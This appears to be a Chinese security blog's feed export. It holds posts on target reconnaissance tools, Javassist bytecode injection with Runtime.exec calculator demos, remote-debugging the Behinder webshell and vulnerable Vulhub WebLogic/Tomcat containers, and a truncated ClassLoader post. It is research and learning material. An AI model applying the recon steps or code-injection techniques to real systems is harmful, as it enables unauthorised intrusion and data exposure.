<li>七麦数据：<a href="https://www.qimai.cn/">https://www.qimai.cn/</a></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003223994-2015673218.png" alt="image-20220401003224149"></p>
<ul>
<li>小蓝本：<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401003436145-1522334794.png" alt="image-20220401003436333"></p>
<ul>
<li>AppStore：<a href="https://apps.apple.com/">https://apps.apple.com/</a></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401004923689-1032764987.png" alt="image-20220401004923517"></p>
<ul>
<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011632625-394917638.png" alt="image-20220401011632788"></p>
<ul>
<li>点点：<a href="https://app.diandian.com/">https://app.diandian.com/</a></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011706699-1039405072.png" alt="image-20220401011706880"></p>
<h3 id="公众号收集"><a href="#公众号收集" class="headerlink" title="公众号收集"></a>公众号收集</h3><ul>
<li>搜狗搜索引擎：<a href="https://weixin.sogou.com/weixin">https://weixin.sogou.com/weixin</a></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005726464-268705547.png" alt="image-20220401005725553"></p>
<ul>
<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401005946939-1109072144.png" alt="image-20220401005947045"></p>
<ul>
<li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011237675-182402682.png" alt="image-20220401011237714"></p>
<h3 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h3><ul>
<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220401011528721-1750840481.png" alt="image-20220401011528606"></p>
<h3 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h3><ul>
<li>Nmap、Masscan：Github上面有一款工具将Nmap和Masscan集成起来，先用Masscan批量扫端口，然后用Nmap识别服务。下载地址：<a href="https://github.com/cwkiller/masscan_to_nmap">https://github.com/cwkiller/masscan_to_nmap</a></li>
<li>小米范WEB查找器</li>
<li>Fofa、Shodan、ZoomEye</li>
<li>利用GoogleHacking</li>
</ul>
<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><ul>
<li>BugScaner：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a></li>
<li>潮汐指纹：<a href="http://finger.tidesec.com/">http://finger.tidesec.com</a></li>
<li>Kscan：<a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a></li>
<li>dismap：<a href="https://github.com/zhzyker/dismap">https://github.com/zhzyker/dismap</a></li>
<li>Ehole：<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></li>
<li>ObserverWard：<a href="https://github.com/0x727/ObserverWard">https://github.com/0x727/ObserverWard</a></li>
<li>scaninfo：<a href="https://github.com/redtoolskobe/scaninfo">https://github.com/redtoolskobe/scaninfo</a></li>
<li>whatweb：<a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></li>
<li>TideFinger：<a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></li>
</ul>
<h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><ul>
<li>github</li>
<li>网盘搜索</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">盘多多：http://www.panduoduo.net/</span><br><span class="line">盘搜搜：http://www.pansoso.com/</span><br><span class="line">盘搜：http://www.pansou.com/</span><br><span class="line">凌云风搜索：https://www.lingfengyun.com/</span><br><span class="line">直接输入厂商名字然后搜索，可以看看是否泄露了源码，或者什么账号密码之类的</span><br></pre></td></tr></table></figure>

<ul>
<li>路径扫描</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch：https://github.com/maurosoria/dirsearch</span><br><span class="line">dirmap：https://github.com/H4ckForJob/dirmap</span><br><span class="line">御剑后台扫描</span><br><span class="line">7kbscan：https://github.com/7kbstorm/7kbscan-WebPathBrute</span><br></pre></td></tr></table></figure>

<ul>
<li>基于证书</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://myssl.com</span><br><span class="line">https://crt.sh/</span><br></pre></td></tr></table></figure>

<ul>
<li>基于shodan找到带有该icon的网站</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g">https://mp.weixin.qq.com/s/a_6M0h-7l9-IKG5F5Nar8g</a></p>
<p><a href="https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A">https://mp.weixin.qq.com/s/uUrlBrwcPPPr6s1yFeGP1A</a></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Javassist动态编程</title>
    <url>/2022/04/27/Java%E5%AE%89%E5%85%A8%E4%B9%8BJavassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="动态编程"><a href="#动态编程" class="headerlink" title="动态编程"></a>动态编程</h3><p>动态编程是相对于静态编程而言的,平时我们讨论比较多的就是静态编程语言，例如Java，与动态编程语言，例如JavaScript。</p>
<span id="more"></span>

<p>那二者有什么明显的区别呢？简单的说就是在静态编程中，类型检查是在编译时完成的，而动态编程中类型检查是在运行时完成的。所谓动态编程就是绕过编译过程在运行时进行操作的技术，在Java中有如下几种方式：</p>
<p><strong>反射</strong><br>这个搞Java的应该比较熟悉，原理也就是通过在运行时获得类型信息然后做相应的操作。</p>
<p><strong>动态编译</strong><br>动态编译是从Java 6开始支持的，主要是通过一个JavaCompiler接口来完成的。通过这种方式我们可以直接编译一个已经存在的java文件，也可以在内存中动态生成Java代码，动态编译执行。</p>
<p><strong>调用JavaScript引擎</strong><br>Java 6加入了对Script(JSR223)的支持。这是一个脚本框架，提供了让脚本语言来访问Java内部的方法。你可以在运行的时候找到脚本引擎，然后调用这个引擎去执行脚本。这个脚本API允许你为脚本语言提供Java支持。</p>
<p><strong>动态生成字节码</strong></p>
<p>这种技术通过操作Java字节码的方式在JVM中生成新类或者对已经加载的类动态添加元素。</p>
<p>方式：</p>
<p><strong>ASM</strong>：直接操作字节码指令，执行效率高，要是使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。</p>
<p><strong>Javassit</strong> ：提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，对使用者要求较低。</p>
<h3 id="什么是Javassist"><a href="#什么是Javassist" class="headerlink" title="什么是Javassist"></a>什么是Javassist</h3><p><code>Javassist</code>是一个开源的分析、编辑和创建Java字节码的类库，Java 字节码存储在称为类文件的二进制文件中。每个类文件包含一个 Java 类或接口。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋）所创建的。其主要的优点，在于简单，而且快速。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。而个人感觉在安全中最重要的就是在使用<code>Javassist</code>时我们可以像写Java代码一样直接插入Java代码片段，让我们不再需要关注Java底层的字节码的和栈操作，仅需要学会如何使用<code>Javassist</code>的API即可实现字节码编辑，类似于可以达到任意代码执行的效果。</p>
<h3 id="Javassist的使用"><a href="#Javassist的使用" class="headerlink" title="Javassist的使用"></a>Javassist的使用</h3><p>在<strong>Javassist</strong>中最为重要的是<code>ClassPool</code>，<code>CtClass</code> ，<code>CtMethod</code> 以及 <code>CtField</code>这几个类。</p>
<p>ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。</p>
<p>CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。</p>
<p>CtMethods：表示类中的方法。</p>
<p>CtFields ：表示类中的字段。</p>
<h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool		<span class="title function_">getDefault</span><span class="params">()</span>			返回默认的类池。</span><br><span class="line">  </span><br><span class="line">ClassPath		<span class="title function_">insertClassPath</span><span class="params">(String pathname)</span>	在搜索路径的开头插入目录或jar（或zip）文件。</span><br><span class="line">  </span><br><span class="line">ClassPath		<span class="title function_">insertClassPath</span><span class="params">(ClassPath cp)</span>		ClassPath在搜索路径的开头插入一个对象。</span><br><span class="line">  </span><br><span class="line">java.lang.ClassLoader	<span class="title function_">getClassLoader</span><span class="params">()</span>	获取类加载器</span><br><span class="line">  </span><br><span class="line">CtClass	<span class="title function_">get</span><span class="params">(java.lang.String classname)</span>	从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。</span><br><span class="line">  </span><br><span class="line">ClassPath	<span class="title function_">appendClassPath</span><span class="params">(ClassPath cp)</span>	 将ClassPath对象附加到搜索路径的末尾。</span><br><span class="line">  </span><br><span class="line">CtClass	<span class="title function_">makeClass</span><span class="params">(java.lang.String classname)</span>  创建一个新的<span class="keyword">public</span>类</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span>	<span class="title function_">setSuperclass</span><span class="params">(CtClass clazz)</span>	更改超类，除非此对象表示接口。</span><br><span class="line"></span><br><span class="line">java.lang.Class&lt;?&gt;	toClass(java.lang.invoke.MethodHandles.Lookup lookup)	</span><br><span class="line">	将此类转换为java.lang.Class对象。</span><br><span class="line">	</span><br><span class="line"><span class="type">byte</span>[]	toBytecode()	将该类转换为类文件。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>	<span class="title function_">writeFile</span><span class="params">()</span>		将由此CtClass 对象表示的类文件写入当前目录。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>	<span class="title function_">writeFile</span><span class="params">(java.lang.String directoryName)</span>	 将由此CtClass 对象表示的类文件写入本地磁盘。</span><br><span class="line"></span><br><span class="line">CtConstructor	<span class="title function_">makeClassInitializer</span><span class="params">()</span>	制作一个空的类初始化程序（静态构造函数）。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span>	<span class="title function_">insertBefore</span> <span class="params">(java.lang.String src)</span>	</span><br><span class="line">在正文的开头插入字节码。</span><br><span class="line"><span class="keyword">void</span>	<span class="title function_">insertAfter</span>	<span class="params">(java.lang.String src)</span>	</span><br><span class="line">在正文的末尾插入字节码。</span><br><span class="line"><span class="keyword">void</span>	<span class="title function_">setBody</span> <span class="params">(CtMethod src, ClassMap map)</span>	</span><br><span class="line">从另一个方法复制方法体。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span>	<span class="title function_">setBody</span><span class="params">(java.lang.String src)</span>	</span><br><span class="line">	设置构造函数主体。</span><br><span class="line"><span class="keyword">void</span>	<span class="title function_">setBody</span><span class="params">(CtConstructor src, ClassMap map)</span>	</span><br><span class="line">	从另一个构造函数复制一个构造函数主体。</span><br><span class="line">CtMethod	<span class="title function_">toMethod</span><span class="params">(java.lang.String name, CtClass declaring)</span>	</span><br><span class="line">	复制此构造函数并将其转换为方法。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="CtField"><a href="#CtField" class="headerlink" title="CtField"></a>CtField</h4><p>CtFields ：表示类中的字段。</p>
<h4 id="动态生成类"><a href="#动态生成类" class="headerlink" title="动态生成类"></a>动态生成类</h4><p>大致有如下几个步骤</p>
<ol>
<li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li>
<li>创建一个自定义类<code>CtClass ctClass = classPool.makeClass();</code></li>
<li>添加实现接口or属性or构造方法or普通方法</li>
</ol>
<ul>
<li><p>添加接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新建一个int类型名为id的成员变量</span></span><br><span class="line"><span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line"><span class="comment">//将id设置为public</span></span><br><span class="line">id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line"><span class="comment">//将该id属性&quot;赋值&quot;给ClassDemo</span></span><br><span class="line">ctClass.addField(id);</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加构造方法(有参)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加有参构造方法</span></span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo(int id)&#123;this.id = id;&#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addConstructor(ctConstructor1);</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcDemo()&#123;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addMethod(ctMethod);</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><p>写入磁盘</p>
<p>这里写入磁盘可以用如下两种方法</p>
<ul>
<li>javassist自带的<code>ctClass.writeFile();</code>可指定绝对路径写入</li>
<li>也可转换为byte流通过<code>FileOutputStream</code>等写入磁盘</li>
</ul>
</li>
<li><p>进行验证：调用方法or属性赋值</p>
</li>
<li><p>tips：</p>
<ul>
<li>这里注意<code>javassist.CannotCompileException</code>异常: 因为同个 Class 是不能在同个 ClassLoader 中加载两次的，所以在输出 CtClass 的时候需要注意下,可以使用<code>javassist</code>自带的classloader解决此问题</li>
<li>反射时<code>newInstance()</code>抛出了<code>java.lang.InstantiationException</code>异常可能是因为没有写无参构造</li>
<li>如果已经加载了通过javassist生成的类，即便是通过反射(如<code>class.forName()</code>)或者<code>new</code>都不是加载一个<code>&quot;新类&quot;</code>，只有换一个ClassLoader加载才会是生成一个<code>&quot;新类&quot;</code></li>
</ul>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javassist.bytecode.AccessFlag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JavassistDemo01</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavassistDemo01</span>();</span><br><span class="line">        a.makeClass0();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeClass0</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//获取默认类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建一个类ClassDemo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;com.sec.test2.ClassDemo&quot;</span>);</span><br><span class="line">        <span class="comment">//让该类实现序列化接口</span></span><br><span class="line">        ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//新建一个int类型名为id的成员变量</span></span><br><span class="line">            <span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line">            <span class="comment">//将id设置为public</span></span><br><span class="line">            id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line">            <span class="comment">//将该id属性&quot;赋值&quot;给ClassDemo</span></span><br><span class="line">            ctClass.addField(id);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加无参构造方法</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo()&#123;&#125;;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加有参构造方法</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo(int id)&#123;this.id = id;&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加普通方法1</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcDemo()&#123;java.lang.Runtime.getRuntime().exec(\&quot;cmd.exe /c calc.exe\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加普通方法2</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod1</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void hello()&#123;System.out.println(\&quot;Hello Javassist!!!\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(ctMethod1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将class文件写入磁盘</span></span><br><span class="line">            <span class="comment">//转换成字节流</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="comment">//写入磁盘</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">classPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.dir&quot;</span>), <span class="string">&quot;/src/main/java/com/sec/test2&quot;</span>), <span class="string">&quot;ClassDemo.class&quot;</span>);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(classPath);</span><br><span class="line">            fos.write(bytes);</span><br><span class="line">            fos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//验证-调用方法</span></span><br><span class="line">            <span class="comment">//注意这里可能会抛javassist.CannotCompileException异常因为同个 Class 是不能在同个 ClassLoader 中加载两次的，所以在输出 CtClass 的时候需要注意下</span></span><br><span class="line">            <span class="comment">//需要通过一个未加载该class的classloader加载即可，为此javassist内置了一个classloader</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取javassist的classloader</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(classPool);</span><br><span class="line">            System.out.println(<span class="string">&quot;loading&quot;</span>);</span><br><span class="line">            <span class="comment">//通过该classloader加载才是新的一个class</span></span><br><span class="line">            Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.sec.test2.ClassDemo&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射调用hello</span></span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>).invoke(clazz.newInstance());</span><br><span class="line">            <span class="comment">//反射调用calc</span></span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;calcDemo&quot;</span>).invoke(clazz.newInstance());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="动态获取类方法"><a href="#动态获取类方法" class="headerlink" title="动态获取类方法"></a>动态获取类方法</h4><ol>
<li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li>
<li>获取目标类<code>CtClass cc = cp.get();</code></li>
<li>获取类的方法<code>CtMethod m = cc.getDeclaredMethod();</code></li>
<li>插入任意代码<code>m.insertBefore(&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;);</code></li>
<li>转换为class对象<code>Class c = cc.toClass();</code></li>
<li>反射调用对象<code>JavassistDemo j= (JavassistDemo)c.newInstance();</code></li>
<li>执行方法<code>j.hello();</code></li>
</ol>
<p>tips：</p>
<ol>
<li>如果目标类未加载过，可以直接调用<code>toClass()</code>方法之后<code>new</code>一个该类的对象即可调用该类。</li>
<li>如果目标类已加载过，就需要用上面的方法，通过javassist的ClassLoader去加载后进行调用。</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/CoLo/p/15383642.html">https://www.cnblogs.com/CoLo/p/15383642.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>动态编程</tag>
      </tags>
  </entry>
  <entry>
    <title>远程调试</title>
    <url>/2022/03/16/%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="对Jar包进行远程调试"><a href="#对Jar包进行远程调试" class="headerlink" title="对Jar包进行远程调试"></a>对Jar包进行远程调试</h2><p>这里以冰蝎做示例，使用IDEA创建一个Java项目，并创建一个lib文件夹将Jar包和它的db数据库放入，再选中lib文件夹后，右键选择“add as library”，将lib文件夹添加进项目依赖，成功添加后可以看到Jar包中反编译后的源代码。</p>
<span id="more"></span>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316105447193-2138419681.png" alt="image-20220316105447105"></p>
<p>通过右上角的“Add Configurations”，并单击“+”来添加一个“Remote”，默认配置即可，单击“apply”提交保存。其中“-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005”将作为运行时的启动参数。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316105651451-1732887489.png" alt="image-20220316105652338"></p>
<p>将“ -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;y,address&#x3D;5005”作为启动参数运行冰蝎的Jar包，suspend表示是否暂停程序等待调试器的连接，“y”表示暂停，“n”表示不暂停。建议选择暂停，避免程序执行过快导致一些断点无法拦截程序。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316105919953-1313789309.png" alt="image-20220316105920262"></p>
<p>设置好断点，单击右上角的Debug按钮，即可发现程序在断点处暂停，然后可以进行逐步的调试了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316110143684-113134102.png" alt="image-20220316110144268"></p>
<h2 id="对Weblogic进行远程调试"><a href="#对Weblogic进行远程调试" class="headerlink" title="对Weblogic进行远程调试"></a>对Weblogic进行远程调试</h2><p>进入&#x2F;weblogic&#x2F;CVE-2017-10271文件夹，修改其中的docker-compose.yml，将8453端口打开，这个端口是用来调试的</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316111611425-940242255.png" alt="image-20220316111612357"></p>
<p>使用<code>docker-compose up -d</code> 命令编译镜像并启动容器，如下容器启动成功，开始8453端口映射到本地</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316112021582-176155912.png" alt="image-20220316112022492"></p>
<p>使用<code>docker exec -it 25 /bin/bash</code>命令进入容器，使用vim修改~&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;bin</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316112500955-289297251.png" alt="image-20220316112501671"></p>
<p>使用<code>docker restart</code>命令重启容器，再进入容器，将&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;下的modules和wlserver_10.3文件夹使用zip命令压缩成zip压缩包。容器中是一个简易的Linux系统，需要执行<code>apt-get install zip</code>来安装zip压缩功能。Windows命令行对路径长度有限制，如果直接使用dokcer的cp指令，就会在复制一些长文件名的文件时报错，因此这一步的目的就是打包成压缩文件再进行复制，使用<code>docker cp</code>命令将zip文件复制到本机下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316114731945-619105757.png" alt="image-20220316114732752"></p>
<p>将该文件夹移动至一个项目文件中，选中wlserver_10.3&#x2F;server&#x2F;lib文件和modules文件右键单击，选择“add as library”添加库</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316121504585-664894600.png" alt="image-20220316121505388"></p>
<p>配置调试器，和上面的jar包一样，端口换成8453就行了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220316121117278-1364284906.png" alt="image-20220316121117895"></p>
<h2 id="对Tomcat进行远程调试"><a href="#对Tomcat进行远程调试" class="headerlink" title="对Tomcat进行远程调试"></a>对Tomcat进行远程调试</h2><p>同样进入Vulhub中CVE-2017-12615漏洞环境所在的文件夹，修改docker-compose.yml文件，将5005端口开启，进入容器中，在&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;bin&#x2F;catalina.sh插入命令<code>JAVA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005&quot;</code>，然后重启docker；下一步就是导出dokcer里面的lib，<code>docker cp 25:/usr/local/tomcat/lib ./</code>，并把lib设置为库，后面配置调试器，和上面的jar包一样。</p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>类加载器ClassLoader</title>
    <url>/2022/03/18/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8ClassLoader/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>ClassLoader即常说的类加载器，其功能是用于从Class文件加载所需的类，主要场景用于热部署、代码热替换等场景。 系统提供了3种类加载器：Bootstrap ClassLoader、Extension ClassLoader、Application ClassLoader。</p>
<span id="more"></span>

<ul>
<li><strong>Bootstrap ClassLoader</strong> 最顶层的加载器-启动类加载器，主要加载核心类库，<code>%JRE_HOME%\lib</code>下的rt.jar、resources.jar、charsets.jar和class等。另外需要注意的是可以通过启动jvm时指定-Xbootclasspath和路径来改变Bootstrap ClassLoader的加载目录。比如<code>java -Xbootclasspath/a:path</code>被指定的文件追加到默认的bootstrap路径中，Java程序无法直接引用该类加载器。</li>
<li><strong>Extention ClassLoader</strong> 扩展类加载器，由Java实现，独立于虚拟机的外部，加载目录<code>%JRE_HOME%\lib\ext</code>目录下的jar包和class文件，还可以加载<code>-D java.ext.dirs</code>选项指定的目录。开发者可直接使用扩展类加载器。 该加载器是由<code>sun.misc.Launcher$ExtClassLoader</code>实现。</li>
<li><strong>Appclass Loader</strong>应用程序类加载器，该加载器是由<code>sun.misc.Launcher$AppClassLoader</code>实现，该类加载器负责加载用户类路径上所指定的类库。开发者可通过<code>ClassLoader.getSystemClassLoader()</code>方法直接获取，故又称为系统类加载器。当应用程序没有自定义类加载器时，默认采用该类加载器。</li>
</ul>
<p>加载顺序</p>
<ol>
<li>Bootstrap CLassloder</li>
<li>Extention ClassLoader</li>
<li>AppClassLoader</li>
</ol>
<h2 id="Launcher分析"><a href="#Launcher分析" class="headerlink" title="Launcher分析"></a>Launcher分析</h2><p>我们查看<code>sun.misc.Launcher</code>类的部分源码，它是java虚拟机的入口应用</p>
